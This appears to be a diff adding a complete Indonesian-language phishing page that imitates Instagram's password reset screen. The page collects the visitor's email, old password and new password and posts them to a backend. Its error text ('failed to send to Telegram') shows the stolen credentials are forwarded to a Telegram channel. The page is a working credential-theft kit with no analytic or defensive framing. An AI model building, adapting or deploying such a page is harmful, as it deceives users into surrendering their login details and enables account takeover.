@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>🔒 Instagram - Reset Password</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #0d0d0d;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    .logo {
+      font-family: 'Segoe Script', cursive;
+      font-size: 28px;
+      margin-bottom: 40px;
+    }
+
+    .title {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 10px;
+      gap: 8px;
+    }
+
+    .description {
+      font-size: 14px;
+      color: #ccc;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .input-box {
+      width: 100%;
+      max-width: 350px;
+      margin-bottom: 15px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 14px;
+      border: none;
+      border-radius: 6px;
+      background-color: #1e1e1e;
+      color: #fff;
+      outline: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      background-color: #405de6;
+      color: white;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background-color: #2b46c2;
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 350px;
+    }
+
+    .alert {
+      width: 100%;
+      max-width: 350px;
+      background-color: #ff4d4d;
+      color: white;
+      padding: 10px 12px;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      font-size: 13px;
+      display: none;
+      text-align: center;
+    }
+
+    .success {
+      background-color: #28a745;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(2px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .loader-box {
+      background-color: #1e1e1e;
+      padding: 20px 30px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .spinner {
+      border: 4px solid #405de6;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto 10px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">Instagram</div>
+
+  <div class="wrapper">
+    <div class="title">Buat Kata Sandi yang Kuat</div>
+    <div class="description">
+      Kata sandi Anda minimal harus enam karakter dan<br />
+      berisi kombinasi angka, huruf, dan karakter khusus (!$@%).
+    </div>
+
+    <div id="alertBox" class="alert"></div>
+
+    <form id="resetForm">
+      <div class="input-box">
+        <input type="email" id="email" placeholder="Email Anda" required />
+      </div>
+
+      <div class="input-box">
+        <input type="password" id="oldPass" placeholder="Kata sandi lama" required />
+      </div>
+
+      <div class="input-box">
+        <input type="password" id="newPass" placeholder="Kata sandi baru" required />
+      </div>
+
+      <div class="input-box">
+        <input type="password" id="repeatPass" placeholder="Kata sandi baru, sekali lagi" required />
+      </div>
+
+      <button class="btn" type="submit">Atur Ulang Kata Sandi</button>
+    </form>
+  </div>
+
+  <div id="overlay" class="overlay">
+    <div class="loader-box">
+      <div class="spinner"></div>
+      <p>Memproses...</p>
+    </div>
+  </div>
+
+  <script>
+    function showAlert(message, success = false) {
+      const alertBox = document.getElementById('alertBox');
+      alertBox.textContent = message;
+      alertBox.classList.toggle('success', success);
+      alertBox.style.display = 'block';
+    }
+
+    document.getElementById('resetForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const oldPass = document.getElementById('oldPass').value.trim();
+      const newPass = document.getElementById('newPass').value.trim();
+      const repeatPass = document.getElementById('repeatPass').value.trim();
+
+      if (newPass !== repeatPass) {
+        showAlert('Kata sandi baru tidak cocok.');
+        return;
+      }
+
+      document.getElementById('overlay').style.display = 'flex';
+
+      try {
+        const res = await fetch('/api/reset', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, oldPass, newPass })
+        });
+
+        if (!res.ok) throw new Error('Gagal');
+
+        setTimeout(() => {
+          window.location.href = 'sukses.html';
+        }, 2000);
+      } catch (err) {
+        document.getElementById('overlay').style.display = 'none';
+        showAlert('❌ Gagal mengirim ke Telegram.');
+      }
+    });
+  </script>
+</body>
+</html>
